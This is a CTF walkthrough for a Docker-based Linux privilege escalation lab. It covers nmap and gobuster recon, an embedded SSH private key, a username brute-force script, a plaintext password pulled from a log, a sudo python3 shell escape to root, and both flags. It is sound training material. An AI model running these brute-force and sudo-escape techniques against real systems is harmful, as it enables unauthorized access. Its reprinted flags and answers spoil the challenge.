# 🧠 xexhausted/ctf – Linux Privilege Escalation Challenge

A beginner **Linux Privilege Escalation CTF** packed inside a Docker container.

This challenge is designed for learners who want hands-on practice with **Linux post-exploitation techniques** commonly seen in real-world systems and CTFs.

---

## 📦 Docker Image

```bash
docker pull xexhausted/ctf
```

---

## 🚀 How to Run

```bash
docker run -it --rm xexhausted/ctf /bin/bash
```

> ⚠️ No internet access is required. Everything you need is already inside the container.

---

## 🎯 Objective

Your goal is to:

1. Start as a **low-privileged user**
2. Enumerate the system
3. Identify a **privilege escalation vector**
4. Gain **root access**
5. Retrieve the flag

---

## 🏁 Flag Format

```text
CTF{....}
```

---


#### First of the using ping to see the connection.

**command:** 
```bash
ping 172.18.0.2
```
![[Pasted image 20250123205938.png]]
___

## Using nmap to check all the open ports"

**command:** 
```bash
nmap 172.18.0.2
```
![[Pasted image 20250123210158.png]]
___

## Checking website: 

While checking website, I found **robots.txt** with a hint.
![[Pasted image 20250123210421.png]]

## Using go buster to find directories:

Command:
```bash
gobuster dir -u http://192.168.1.116:8080/ -w ~/Documents/SecLists/Discovery/Web-Content/big.txt  -t 200
```

Output:
![[Pasted image 20250123210625.png]]
___

## Checking all discover directories:

### /far : nothing was there.
### /close: found ssh.txt, something like private id_rsa. (http://192.168.1.116:8080/near/username.py)
### /near: found username.py, A python program to print usernames.(http://192.168.1.116:8080/close/ssh.txt)

Might be there could be usernames needed for ssh. Let's try bruteforcing ssh with id_rsa and usernames .
___

## Let's prepare id_rsa and username:
### For id_rsa, copy all the content and save it somewhere in your linux.
```bash
echo "-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----" > id_rsa
```

Set permission like this:
```bash
chmod 600 id_rsa
```
___

## Lets make wordlist for username: 

```bash
echo -e "arjun.pandey\nsita.sharma\nbinod.khadka\nrita.dahal\nbishnu.thapa\nram_jhakri\npratik.adhikari\nmira.gurung\nkrishna.kc\nanjali.magar\nrajesh.tamang" > username.txt

```
___
## You can bruteforce manually or by using tool like :

### Lets try medusa tool:
hydra can't be useful in this because, hydra directly don't work with id_rsa

**script:**
```bash
#!/bin/bash

target_ip="172.18.0.1"
private_key="id_rsa"
usernames_file="username.txt"
ssh_port=2222

# Loop through each username
while read -r username; do
  ssh -i "$private_key" "$username"@"$target_ip" -p "$ssh_port" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PasswordAuthentication=no exit
  if [ $? -eq 0 ]; then
    echo "Successfully connected with username: $username"
  else
    echo "Failed to connect with username: $username"
  fi
done < "$usernames_file"
```
___

## By brute forcing:
![[Pasted image 20250123213909.png]]

**ram_jhakri** was the real username.

## Connecting to ssh using id_rsa:
**command:**
```bash
ssh -i id_rsa ram_jhakri@172.18.0.2
```

![[Pasted image 20250123214008.png]]
___
### try to find some thing:
![[Pasted image 20250123220450.png]]

I got, 
.hint_for_real_flag: there are two flag one is user.txt and another is root.txt
.user.txt : CTF{L1nux_D0ck3r_1s_Aw3s0me}
___

## After searching: there is a hint saying 

with this command:
```bash
find / -type f -name "*.txt" 2>/dev/null
```
![[Pasted image 20250124213416.png]]

Hint.txt:
![[Pasted image 20250124213458.png]]

base64 decoder: https://www.base64decode.org/
![[Pasted image 20250124213548.png]]

generally, log in located in /var/log. So, let's check logs.
___

After just listing the file there was the sus looking log file **system_login.log**
we find plaintext password inside it.
![[Pasted image 20250124213818.png]]
Command:
```bash
grep ram_jhakri /var/log/login_system.log
```
password: Password123

___

Interesting thing is that we can run **sudo** command .

command:
```bash
sudo -l
```
![[Pasted image 20250124214049.png]]

### Permissions Breakdown:

1. **User `ram_jhakri` can run the following commands:**
    - `(ALL) NOPASSWD: ALL`
        - **Meaning**: The user can run **any command as any user without entering a password**, but there are exceptions (`!` entries).

    - `(ALL) NOPASSWD: /usr/bin/python3`
        - **Meaning**: The user can specifically run `/usr/bin/python3` as any user without a password.

### What This Means:

1. The user has **very broad `sudo` privileges** but cannot directly use `rm`.
2. The ability to run `/usr/bin/python3` with `sudo` is significant, as Python allows execution of arbitrary commands via the `os` or `subprocess` modules.

___
### Let's try to expoit this a get root.
link: https://gtfobins.github.io/gtfobins/python/#shell
command:
```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```
After this we can get root.


![[Pasted image 20250124214330.png]]

root flag: CTF{L1nux_E5ca1ation_1s_Aw3s0me}

## End


Happy hacking 🚀
